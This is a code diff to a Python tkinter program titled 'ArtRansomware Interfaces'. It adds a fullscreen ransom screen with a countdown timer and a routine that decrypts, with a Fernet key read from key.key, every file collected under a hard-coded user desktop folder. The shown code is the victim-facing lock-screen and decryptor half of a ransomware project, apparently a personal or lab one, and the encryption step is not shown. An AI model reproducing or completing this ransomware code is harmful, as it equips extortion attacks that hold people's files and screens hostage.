@@ -7,6 +7,18 @@ from tkinter import messagebox as MessageBox
 from tkinter import simpledialog
 from PIL import Image, ImageTk
 import re
+from cryptography.fernet import Fernet
+import sys
+import os
+from termcolor import colored
+import allfiles1
+import signal
+
+def def_handler(sig, frame):
+    print(colored (f"\n[!] Saliendo...\n", "red"))
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
 
 root = tk.Tk()
 root.title("ArtRansomware Interfaces")
@@ -14,7 +26,24 @@ width = root.winfo_screenwidth()
 height = root.winfo_screenheight()
 #root.geometry("%dx%d" % (width, height))
 root.attributes('-fullscreen',True)
+base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
+allfiles1.searching_files(base_directory)
+files = allfiles1.file_list
 
+def return_key():
+    return open('key.key', 'rb').read()
+
+
+
+def file_decrypt(files, key):
+    fernet = Fernet(key)
+    for filepath in files:
+        with open(filepath, "rb") as file:
+            data_to_decrypt = file.read()
+        data = fernet.decrypt(data_to_decrypt)
+
+        with open(filepath, "wb") as file:
+            file.write(data)
 
 def start_timer(countdown):
     if countdown >= 0:
@@ -108,4 +137,3 @@ frame1.pack()
 
 
 root.mainloop()
-
